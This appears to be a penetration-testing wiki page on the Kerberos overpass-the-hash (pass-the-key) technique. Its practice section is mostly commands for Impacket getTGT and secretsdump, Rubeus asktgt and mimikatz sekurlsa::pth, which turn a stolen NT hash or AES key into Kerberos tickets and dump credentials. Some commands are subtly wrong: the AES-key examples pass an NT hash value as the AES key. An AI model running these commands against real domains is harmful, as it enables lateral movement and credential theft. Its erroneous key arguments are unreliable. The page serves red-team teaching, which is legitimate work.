# Overpass the hash

## Theory

In short, an attacker knowing a user's NT hash can use it to authenticate over NTLM \([pass-the-hash](../abusing-lm-and-ntlm/pass-the-hash.md)\) or indirectly over Kerberos \(overpass-the-hash\) when the RC4 etype is not disabled. When RC4 is disabled, other Kerberos keys \(DES, AES128, AES256\) can be passed as well, which is why overpass-the-hash is also known as pass-the-key, only the key type differs.

With overpass-the-hash, an attacker can leverage a user's Kerberos key \(i.e. NT hash is RC4 etype is enabled, true by default\) to request a TGT \(pre-authentication\), that can then be used with [pass-the-ticket](pass-the-ticket.md) to request a TGS \(Service ticket\) and access a service using Kerberos.

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [getTGT](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py) \(Python\) can request a TGT \(Ticket Granting Ticket\) given a password, hash \(`LMhash` can be empty\), or aesKey. The TGT will be saved as a `.ccache` file that can then be used by other Impacket scripts.

```bash
# with an NT hash (overpass-the-hash)
getTGT.py -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET

# with an AES (128 or 256 bits) key (pass-the-key)
getTGT.py -aesKey 'LMhash:NThash' $DOMAIN/$USER@$TARGET
```

Once a TGT is obtained, the tester can use it with the environment variable `KRB5CCNAME` with tools implementing [pass-the-ticket](pass-the-ticket.md).

An alternative to requesting the TGT and then passing the ticket is using the `-k` option in Impacket scripts. Example below with secretsdump.

```bash
secretsdump.py -k -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET
```
{% endtab %}

{% tab title="Windows" %}
On Windows, requesting a TGT can be achieved with [Rubeus](https://github.com/GhostPack/Rubeus) \(C\#\). The ticket will be injected in the session and Windows will natively be able to use these tickets to access given services.

```bash
# with an NT hash
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /rc4:$NThash /ptt

# with an AES 128 key
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes128:$NThash /ptt

# with an AES 256 key
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes256:$NThash /ptt
```

An alternative to Rubeus is [mimikatz](https://github.com/gentilkiwi/mimikatz).

```bash
# with an NT hash
sekurlsa::pth /user:$USER /domain:$DOMAIN /rc4:$NThash /ptt

# with an AES 128 key
sekurlsa::pth /user:$USER /domain:$DOMAIN /aes128:$aes128_key /ptt

# with an AES 256 key
sekurlsa::pth /user:$USER /domain:$DOMAIN /aes256:$aes256_key /ptt
```

For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](pass-the-ticket.md#injecting-the-ticket).
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://blog.notso.pro/2020-05-09-offops-in-ad-1/" caption="" %}

{% embed url="http://blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash" caption="" %}

{% embed url="https://blog.stealthbits.com/how-to-detect-overpass-the-hash-attacks/" caption="" %}

